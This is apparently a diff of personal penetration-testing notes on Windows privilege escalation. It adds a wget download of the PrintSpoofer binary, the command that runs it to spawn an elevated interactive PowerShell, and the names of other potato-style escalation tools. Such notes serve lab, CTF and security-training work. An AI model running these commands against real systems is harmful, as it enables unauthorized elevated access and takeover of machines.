@@ -318,8 +318,14 @@ Yes but you need admin privileges, powershell scripting enabled, its a headache
 Get newest version of Print Spoofer
 
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
-
 You can also compile from source code on that repo, but it was taking too long, journey for another day
+
+Run PrintSpoofer to spawn a powershell 
+.\PrintSpoofer64.exe -i -c powershell.exe
+
+-c is command, -i is to interact with it
+
+Other Se Priv  escalation tools: RottenPotato, SweetPotato, or JuicyPotato
 
 
 
